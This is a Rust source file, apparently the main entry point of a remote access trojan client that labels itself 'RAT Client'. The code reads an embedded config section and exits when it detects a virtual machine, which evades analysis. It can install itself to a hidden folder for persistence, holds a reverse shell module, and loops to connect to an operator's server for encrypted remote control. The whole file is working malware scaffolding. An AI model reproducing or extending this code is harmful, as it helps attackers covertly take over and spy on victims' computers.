// #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
// #![cfg_attr(debug_assertions, windows_subsystem = "windows")]

#[no_mangle]
#[link_section = ".zzz"]
static CONFIG: [u8; 1024] = [0; 1024];

use std::time::Duration;

#[cfg(windows)]
mod win {
    pub use winapi::um::winuser::SetProcessDPIAware;
}

pub mod features;
pub mod service;
pub mod handler;

use tokio::{net::TcpStream, sync::oneshot, time::sleep};
use common::{connection::Connection, packets::*};

use std::sync::{Arc, Mutex};
use once_cell::sync::Lazy;

use features::encryption;

static MUTEX_SERVICE: Lazy<Mutex<service::mutex::MutexLock>> = Lazy::new(||
    Mutex::new(service::mutex::MutexLock::new())
);

static REVERSE_SHELL: Lazy<Mutex<features::reverse_shell::ReverseShell>> = Lazy::new(||
    Mutex::new(features::reverse_shell::ReverseShell::new())
);

#[tokio::main(flavor = "current_thread")]
async fn main() {
    let config = service::config::get_config();

    if config.anti_vm_detection && service::anti_vm::anti_vm_detection() {
        std::process::exit(0);
    }

    #[cfg(windows)]
    {
        let tray_icon = Arc::new(Mutex::new(service::tray_icon::TrayIcon::new()));
        tray_icon.lock().unwrap().set_unattended(config.unattended_mode);
        tray_icon.lock().unwrap().show();

        unsafe {
            // FIX REMOTE DESKTOP DPI ISSUES
            win::SetProcessDPIAware();
        }
    }

    {
        // MUTEX SERVICE
        let mut mutex_lock_guard = MUTEX_SERVICE.lock().unwrap();
        mutex_lock_guard.init(config.mutex_enabled, config.mutex.clone());
    }

    if config.install {
        service::install::install(config.install_folder.clone(), config.file_name.clone(), config.enable_hidden);
    }

    // Main connection loop
    loop {
        #[cfg(windows)]
        let tray_icon = Arc::new(Mutex::new(service::tray_icon::TrayIcon::new()));

        // Connect to server phase
        println!("Connecting to server...");

        #[cfg(windows)]
        {
            tray_icon.lock().unwrap().set_tooltip("RAT Client: Connecting...");
        }
        
        let socket = match TcpStream::connect(format!("{}:{}", config.ip, config.port)).await {
            Ok(socket) => socket,
            Err(e) => {
                println!("Connection failed: {}. Retrying in 5 seconds...", e);
                sleep(Duration::from_secs(5)).await;
                continue;
            }
        };

        #[cfg(windows)]
        {
            tray_icon.lock().unwrap().set_tooltip("RAT Client: Connected");
        }

        // Encryption handshake phase
        println!("Connected to server. Performing encryption handshake...");
        let connection = Connection::<ClientboundPacket, ServerboundPacket>::new(socket);
        
        let encryption_result = encryption::perform_encryption_handshake(connection).await;
        
        match encryption_result {
            Ok((encryption_state, reader, writer)) => {
                // Setup communication channel between reader and writer
                let (tx, rx) = oneshot::channel::<()>();

                // Start writer task
                let write_task = tokio::spawn(
                    handler::writing_loop(
                        writer, 
                        rx, 
                        encryption_state.secret.clone(), 
                        encryption_state.nonce_generator_write
                    )
                );
                
                // Small delay to ensure writer is ready
                sleep(Duration::from_millis(100)).await;
                
                // Start reader task (will block until connection ends)
                handler::reading_loop(
                    reader, 
                    tx, 
                    encryption_state.secret.clone(), 
                    encryption_state.nonce_generator_read
                ).await;
                
                // Wait for writer to complete
                if let Err(e) = write_task.await {
                    println!("Write task error: {}", e);
                }

                #[cfg(windows)]
                {
                    tray_icon.lock().unwrap().set_tooltip("RAT Client: Disconnected");
                }
                
                sleep(Duration::from_secs(5)).await;
            },
            Err(_) => {
                #[cfg(windows)]
                {
                    tray_icon.lock().unwrap().set_tooltip("RAT Client: Disconnected");
                }

                sleep(Duration::from_secs(5)).await;
            }
        }
    }
}